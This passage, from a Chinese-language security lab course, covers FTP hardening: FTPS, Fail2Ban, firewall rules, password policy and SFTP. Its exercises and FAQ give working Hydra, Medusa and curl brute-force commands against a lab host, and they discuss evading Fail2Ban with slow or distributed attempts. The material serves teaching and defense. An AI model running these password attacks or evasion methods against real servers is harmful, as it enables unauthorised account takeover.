sudo tee /etc/vsftpd.user_list > /dev/null << 'EOF'
ftpuser1
ftpuser2
ftpadmin
EOF

sudo chmod 644 /etc/vsftpd.user_list
sudo systemctl restart vsftpd
```

### 2. 🔐 部署 FTP over TLS (FTPS)

明文 FTP 的最大风险是凭证在网络上以明文传输。部署 FTPS 可以加密传输通道：

```bash
# 安装 OpenSSL
sudo apt install -y openssl

# 生成 SSL 证书
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/ssl/private/vsftpd.key \
  -out /etc/ssl/certs/vsftpd.crt \
  -subj "/C=CN/ST=Beijing/L=Beijing/O=SecurityLab/CN=ftp.security.lab"

# 在 vsftpd.conf 中添加 TLS 配置
sudo tee -a /etc/vsftpd.conf > /dev/null << 'EOF'

# ===== TLS/SSL 配置 =====
ssl_enable=YES                 # ✅ 启用 SSL/TLS
allow_anon_ssl=NO
force_local_logins_ssl=YES     # ✅ 强制登录使用 SSL
force_local_data_ssl=YES       # ✅ 强制数据传输使用 SSL
ssl_tlsv1=YES
ssl_sslv2=NO
ssl_sslv3=NO
require_ssl_reuse=NO
ssl_ciphers=HIGH
rsa_cert_file=/etc/ssl/certs/vsftpd.crt
rsa_private_key_file=/etc/ssl/private/vsftpd.key
EOF

sudo systemctl restart vsftpd
```

**验证 FTPS 连接**：

```bash
lftp -u ftpuser1 -p 21 192.168.1.100
# 在 lftp 中设置 FTPS
set ftp:ssl-force true
set ftp:ssl-protect-data true
```

### 3. 🚫 使用 Fail2Ban 防暴力破解

```bash
# 安装 Fail2Ban
sudo apt install -y fail2ban

# 创建 FTP 专用配置
sudo tee /etc/fail2ban/jail.d/vsftpd.local > /dev/null << 'EOF'
[vsftpd]
enabled = true
port = ftp,ftp-data,ftps,ftps-data
filter = vsftpd
log_path = /var/log/vsftpd.log
maxretry = 3                   # 3 次失败后封禁
findtime = 300                 # 5 分钟内
bantime = 3600                 # 封禁 1 小时
EOF

sudo systemctl enable fail2ban
sudo systemctl start fail2ban

# 查看封禁状态
sudo fail2ban-client status vsftpd
```

预期输出：

```
Status for the jail: vsftpd
|- Filter
|  |- Currently failed: 0
|  |- Total failed:     15
|  |- File list:        /var/log/vsftpd.log
`- Actions
   |- Currently banned: 1
   |- Total banned:     1
   `- Banned IP list:   192.168.1.50
```

> 🎯 Fail2Ban 在 5 分钟内检测到 3 次登录失败后，自动封禁攻击者 IP 1 小时。这是对抗暴力破解最有效的手段之一。

### 4. 🔥 防火墙策略

```bash
# 使用 ufw 配置防火墙
sudo ufw default deny incoming
sudo ufw default allow outgoing

# 仅允许特定 IP 访问 FTP
sudo ufw allow from 192.168.1.0/24 to any port 21 proto tcp
sudo ufw allow from 192.168.1.0/24 to any port 50000:50100 proto tcp

sudo ufw enable
sudo ufw status verbose
```

### 5. 📋 密码策略强化

```bash
# 安装密码质量检查工具
sudo apt install -y libpam-pwquality

# 配置密码策略
sudo tee /etc/security/pwquality.conf > /dev/null << 'EOF'
minlen = 12          # 密码最小长度
ucredit = -1         # 至少1个大写字母
lcredit = -1         # 至少1个小写字母
dcredit = -1         # 至少1个数字
ocredit = -1         # 至少1个特殊字符
usercheck = 1        # 禁止包含用户名
EOF

# 设置密码过期策略
sudo chage -M 90 ftpuser1      # 密码 90 天过期
sudo chage -W 7 ftpuser1       # 提前 7 天警告
sudo chage -l ftpuser1         # 查看密码策略
```

### 6. 📊 日志监控与告警

```bash
# 配置日志轮转
sudo tee /etc/logrotate.d/vsftpd > /dev/null << 'EOF'
/var/log/vsftpd.log {
    daily
    rotate 30
    compress
    missingok
    notifempty
    create 0640 root adm
}
EOF
```

**简易日志监控脚本**：

```bash
cat > /usr/local/bin/ftp_monitor.sh << 'SCRIPT'
#!/bin/bash
# FTP 登录失败监控脚本
LOG="/var/log/vsftpd.log"
THRESHOLD=10

fail_count=$(awk -v d="$(date -d '1 min ago' '+%b %_d %H:%M')" \
  '$0 >= d && /FAIL LOGIN/ {count++} END {print count+0}' "$LOG")

if [ "$fail_count" -ge "$THRESHOLD" ]; then
    echo "[ALERT] 检测到 FTP 暴力破解！最近1分钟失败次数: $fail_count" >&2
fi
SCRIPT

chmod +x /usr/local/bin/ftp_monitor.sh
echo "* * * * * root /usr/local/bin/ftp_monitor.sh" | sudo tee /etc/cron.d/ftp_monitor
```

### 7. 🔄 考虑使用 SFTP 替代 FTP

最根本的防御是**不使用 FTP**，改用更安全的替代方案：

| 协议 | 端口 | 加密 | 认证 | 推荐 |
|------|------|------|------|------|
| FTP | 21 | ❌ 无 | 用户名/密码 | ❌ 不推荐 |
| FTPS | 21+990 | ✅ TLS | 证书+密码 | 🟡 可用 |
| SFTP | 22 | ✅ SSH | 密钥+密码 | ✅ 推荐 |
| SCP | 22 | ✅ SSH | 密钥+密码 | ✅ 推荐 |
| WebDAV over HTTPS | 443 | ✅ TLS | 多种 | ✅ 推荐 |

```bash
# 确保 sshd_config 中启用 SFTP 子系统
grep -i sftp /etc/ssh/sshd_config
# 预期输出：Subsystem sftp /usr/lib/openssh/sftp-server
```

---

## ✏️ 课后练习

### 练习 1：⭐ 基础——修改 vsftpd 端口并爆破

**目标**：将 vsftpd 修改为监听 2121 端口，然后使用 Hydra 对非标准端口进行爆破。

**提示**：
```bash
# 修改 vsftpd.conf
listen_port=2121

# Hydra 指定端口
hydra -l ftpuser1 -P passwords_small.txt -s 2121 ftp://192.168.1.100
```

**验收标准**：成功在 2121 端口上爆破出密码。

---

### 练习 2：⭐⭐ 进阶——使用 Medusa 爆破 FTP

**目标**：使用 Medusa 工具对同一靶机进行爆破，对比与 Hydra 的异同。

**提示**：
```bash
sudo apt install -y medusa
medusa -h 192.168.1.100 -u ftpuser1 -P passwords_small.txt -M ftp
```

**验收标准**：
1. 使用 Medusa 成功爆破出密码
2. 对比 Hydra 和 Medusa 的速度和输出格式
3. 总结两种工具的优缺点

---

### 练习 3：⭐⭐ 进阶——配置 Fail2Ban 防御

**目标**：在靶机上配置 Fail2Ban，然后再次尝试使用 Hydra 爆破，观察防御效果。

**步骤**：
1. 配置 Fail2Ban（maxretry=3, findtime=300, bantime=600）
2. 使用 Hydra 进行爆破
3. 观察攻击何时被封禁
4. 查看 Fail2Ban 日志

**验收标准**：
1. Fail2Ban 成功封禁攻击者 IP
2. 记录从开始攻击到被封禁所用的时间和尝试次数
3. 手动解封 IP 并重试

---

### 练习 4：⭐⭐⭐ 高级——部署 FTPS 并验证加密效果

**目标**：为 vsftpd 配置 FTP over TLS，使用 Wireshark 对比加密前后的流量差异。

**步骤**：
1. 配置 vsftpd SSL/TLS
2. 启动 Wireshark 捕获 FTP 流量（加密前）
3. 启动 Wireshark 捕获 FTPS 流量（加密后）
4. 对比两次捕获结果

**验收标准**：
1. FTPS 连接成功建立
2. 在明文 FTP 流量中可以清晰看到用户名和密码
3. 在 FTPS 流量中无法看到明文凭证

---

### 练习 5：⭐⭐⭐ 高级——编写自动化 FTP 安全审计脚本

**目标**：编写一个 Bash 脚本，自动完成以下检查：

1. 检查匿名登录是否开启
2. 检查 Banner 是否泄露版本信息
3. 检查是否启用 TLS
4. 尝试常见弱密码（限3次，避免触发 Fail2Ban）
5. 输出安全评估报告

**提示**：
```bash
#!/bin/bash
# ftp_audit.sh - FTP 安全审计脚本
TARGET=$1
if [ -z "$TARGET" ]; then
    echo "用法: $0 <target_ip>"
    exit 1
fi

echo "=== FTP 安全审计报告 ==="
echo "目标: $TARGET"
echo "时间: $(date)"

# 1. Banner 检查
banner=$(echo "QUIT" | nc -w 3 $TARGET 21 2>/dev/null | head -1)
echo "[1] Banner: $banner"

# 2. 匿名登录检查
anon_result=$(echo -e "USER anonymous\nPASS test@test.com\nQUIT" | nc -w 3 $TARGET 21 2>/dev/null)
if echo "$anon_result" | grep -q "230"; then
    echo "[2] 匿名登录: ⚠️ 开启"
else
    echo "[2] 匿名登录: ✅ 关闭"
fi

# ... 继续完善
```

**验收标准**：脚本可以自动完成全部5项检查并输出报告。

---

### 练习 6：⭐⭐⭐⭐ 专家——对抗 Fail2Ban 的低速爆破

**目标**：研究如何绕过 Fail2Ban 的低速爆破策略（纯学习目的），并设计更有效的防御方案。

**思考方向**：
- 降低爆破频率（每次尝试间隔多长时间可以避免被封禁？）
- 分布式攻击（从多个 IP 发起攻击）
- Fail2Ban 的 findtime 参数如何影响检测效果？

**防御设计**：
- 如何检测低速爆破？
- 除了 Fail2Ban，还有什么防御手段？
- 如何设计"自适应封禁"策略？

**验收标准**：提交一份分析报告，包含攻击策略分析和防御方案设计。

---

## ❓ 常见问题 FAQ

### Q1：Hydra 爆破 FTP 时出现 "Connection refused" 怎么办？

**A**：可能的原因和解决方案：

1. **FTP 服务未启动**：`sudo systemctl status vsftpd`
2. **防火墙阻止**：`sudo ufw status`
3. **IP 地址错误**：`ping <TARGET_IP>`
4. **vsftpd 配置错误**：`sudo journalctl -u vsftpd -n 20`

```bash
# 排查步骤
nc -zv <TARGET_IP> 21          # 测试端口连通性
sudo systemctl restart vsftpd   # 重启 FTP 服务
sudo ss -tlnp | grep :21       # 确认端口监听
```

---

### Q2：Hydra 报错 "invalid password in passwordfile" 是什么原因？

**A**：密码字典文件中可能包含特殊字符或格式问题：

```bash
# 检查字典文件编码
file passwords.txt

# 转换为 UTF-8（如果需要）
iconv -f GBK -t UTF-8 passwords.txt > passwords_utf8.txt

# 去除 Windows 换行符
dos2unix passwords.txt
# 或者
sed -i 's/\r$//' passwords.txt

# 去除空行
sed -i '/^$/d' passwords.txt
```

---

### Q3：Hydra 爆破速度太慢怎么办？

**A**：优化策略：

1. **减小字典**：使用精简字典而非 rockyou.txt 全量
2. **调整线程**：适当增加 `-t` 参数（但不要超过 10）
3. **网络优化**：确保攻击机与靶机在同一局域网
4. **分段爆破**：将大字典拆分为多个小文件，并行运行多个 Hydra 实例

```bash
# 将大字典拆分
split -l 100000 rockyou.txt chunk_

# 多个 Hydra 实例并行
hydra -l ftpuser1 -P chunk_aa -t 4 ftp://192.168.1.100 &
hydra -l ftpuser1 -P chunk_ab -t 4 ftp://192.168.1.100 &
```

---

### Q4：如何判断爆破是否成功？Hydra 的输出可信吗？

**A**：Hydra 的结果可能出现误报（false positive），建议：

1. **手动验证**：使用 `ftp` 命令手动登录确认
2. **交叉验证**：使用其他工具（如 Medusa）验证同一结果
3. **检查日志**：在靶机上查看 vsftpd 日志，确认是否有 `OK LOGIN` 记录
4. **调低线程**：线程数过高时容易产生误报，降低到 `-t 4` 可以减少误报

---

### Q5：vsftpd 配置修改后不生效怎么办？

**A**：常见原因和解决方案：

1. **未重启服务**：`sudo systemctl restart vsftpd`
2. **配置语法错误**：检查 vsftpd.conf 中是否有拼写错误
3. **被其他配置覆盖**：检查 `/etc/vsftpd.d/` 目录下是否有额外配置
4. **端口冲突**：`sudo ss -tlnp | grep :21`

```bash
# 调试 vsftpd 配置
sudo journalctl -u vsftpd -n 20 --no-pager
```

---

### Q6：FTP 主动模式和被动模式对 Hydra 有影响吗？

**A**：**没有影响**。Hydra 的 FTP 模块只使用控制连接（TCP 21）进行认证交互，不需要建立数据连接。USER 和 PASS 命令都在控制连接上传输，因此无论 FTP 服务器配置为主动模式还是被动模式，Hydra 都能正常工作。

---

### Q7：能否用 Hydra 爆破 FTPS（FTP over TLS）？

**A**：**可以，但需要特殊处理**。Hydra 本身不直接支持 FTPS，但可以：

1. 使用 `stunnel` 将 FTPS 转换为普通 FTP：
```bash
sudo apt install -y stunnel

cat > /etc/stunnel/ftps.conf << 'EOF'
[ftp]
client = yes
accept = 127.0.0.1:2121
connect = 192.168.1.100:990
EOF

sudo stunnel /etc/stunnel/ftps.conf

hydra -l ftpuser1 -P passwords.txt -s 2121 ftp://127.0.0.1
```

2. 使用支持 FTPS 的工具（如 lftp + 脚本）替代 Hydra

---

### Q8：如何防止自己的 FTP 服务器被暴力破解？

**A**：多层防御策略：

| 层级 | 措施 | 效果 |
|------|------|------|
| 网络层 | 防火墙限制来源 IP | 阻止未授权访问 |
| 传输层 | 部署 FTPS/SFTP | 防止凭证嗅探 |
| 应用层 | 禁用匿名登录 | 减少攻击面 |
| 应用层 | 用户白名单 | 限制可登录用户 |
| 应用层 | 限制每IP连接数 | 减缓爆破速度 |
| 监控层 | Fail2Ban | 自动封禁暴力破解 |
| 监控层 | 日志监控告警 | 及时发现攻击 |
| 策略层 | 强密码策略 | 增加破解难度 |
| 架构层 | 使用 SFTP 替代 FTP | 根本解决问题 |

---

### Q9：Hydra 爆破时出现 "too many connections" 怎么办？

**A**：FTP 服务器限制了并发连接数：

1. **降低线程数**：`-t 2` 或 `-t 1`
2. **增加延迟**：Hydra 本身不支持请求间延迟，可以使用外部脚本实现：
```bash
while read password; do
    result=$(curl -s --connect-timeout 5 \
        "ftp://ftpuser1:${password}@192.168.1.100/" 2>&1)
    if [ $? -eq 0 ]; then
        echo "[+] 密码找到: $password"
        break
    fi
    sleep 1  # 每次尝试间隔1秒
done < passwords.txt
```
3. **调整 vsftpd 的 max_per_ip**（如果是自己的靶机）：`max_per_ip=10`

---

### Q10：本实验中学到的技术可以用于哪些 CTF 题目？

**A**：本实验的技术在以下 CTF 题型中非常实用：

1. **Web 题中的 FTP 信息泄露**：通过匿名 FTP 获取 Web 源码或配置文件
2. **Crypto 题中的密钥获取**：爆破 FTP 获取加密密钥文件
3. **Pwn 题的前期信息收集**：通过 FTP 获取目标二进制文件
4. **综合题的横向移动**：使用 FTP 凭证尝试 SSH 登录（凭证复用）
5. **Red Team 题的持久化**：利用 FTP 上传 WebShell 或后门

---

## 📝 总结

### 核心要点回顾

1. 🎯 **FTP 协议固有的不安全性**：明文传输、简单认证、缺乏防护机制，使其成为暴力破解的理想目标
2. ⚔️ **Hydra 是 FTP 爆破的高效工具**：简单易用，支持字典攻击，多线程并发
3. 🔍 **侦察是爆破的前提**：先识别服务类型、测试匿名访问、枚举用户名，再针对性爆破
4. 🛡️ **防御需要多层次**：单一措施不够，需要网络层+应用层+监控层的综合防御
5. 🔄 **SFTP 是更好的选择**：从根本上解决 FTP 的安全问题

### 攻击流程总结

```
侦察阶段                    攻击阶段                    后渗透阶段
┌──────────┐             ┌──────────┐             ┌──────────┐
│ 端口扫描  │             │ Hydra爆破 │             │ 结果验证  │
│ Banner获取│ ──────────> │ 字典攻击  │ ──────────> │ 数据获取  │
│ 匿名测试  │             │ 参数优化  │             │ 横向移动  │
│ 用户枚举  │             │ 多工具交叉│             │ 痕迹清理  │
└──────────┘             └──────────┘             └──────────┘
```

### 防御措施总结

```
网络层                    应用层                    监控层
┌──────────┐             ┌──────────┐             ┌──────────┐
│ 防火墙    │             │ 禁用匿名  │             │ 日志记录  │
│ IP白名单  │ ──────────> │ 用户白名单│ ──────────> │ Fail2Ban │
│ VPN接入   │             │ 强密码策略│             │ 告警通知  │
│ 端口限制  │             │ FTPS/TLS │             │ 审计追踪  │
└──────────┘             └──────────┘             └──────────┘
```

---

## ✅ 检查清单

完成本实验后，请逐项检查：

### 环境搭建
- [ ] vsftpd 安装成功并正常运行
- [ ] 创建了多个测试用户（含弱密码和强密码）
- [ ] 匿名 FTP 配置正确并可访问
- [ ] 攻击机与靶机网络互通

### 攻击技能
- [ ] 能够使用 ftp 命令手动连接和操作 FTP 服务器
- [ ] 能够测试匿名 FTP 访问并下载文件
- [ ] 能够使用 nmap 识别 FTP 服务类型和版本
- [ ] 能够使用 Hydra 对 FTP 进行单用户爆破
- [ ] 能够使用 Hydra 对 FTP 进行多用户爆破
- [ ] 能够调整 Hydra 的线程数、超时等参数
- [ ] 能够保存和解读爆破结果
- [ ] 能够通过 vsftpd 日志分析攻击痕迹

### 防御技能
- [ ] 能够配置 vsftpd 安全加固选项
- [ ] 能够部署 FTP over TLS (FTPS)
- [ ] 能够配置 Fail2Ban 防暴力破解
- [ ] 能够配置防火墙限制 FTP 访问
- [ ] 能够设置密码策略强化账户安全
- [ ] 了解 SFTP 作为 FTP 替代方案的优势

### 思考与拓展
- [ ] 理解 FTP 协议的安全缺陷及根本原因
- [ ] 理解暴力破解的原理和防御思路
- [ ] 能够根据目标特征定制密码字典
- [ ] 了解低速爆破和分布式爆破的应对策略
- [ ] 能够编写 FTP 安全审计脚本

---

> 💬 **结语**：掌握攻击技术是为了更好地防御。在实际工作中，你应该重点关注如何加固 FTP 服务、检测异常行为、以及推动从 FTP 向更安全的 SFTP 迁移。记住：最好的防御不是让攻击者猜不到密码，而是让攻击者根本无法尝试。

---

> ⚠️ **法律声明**：本课件内容仅供网络安全教学和授权渗透测试使用。未经授权对任何系统进行密码爆破或其他攻击行为属于违法行为，可能面临刑事处罚。请在合法授权范围内使用所学知识。
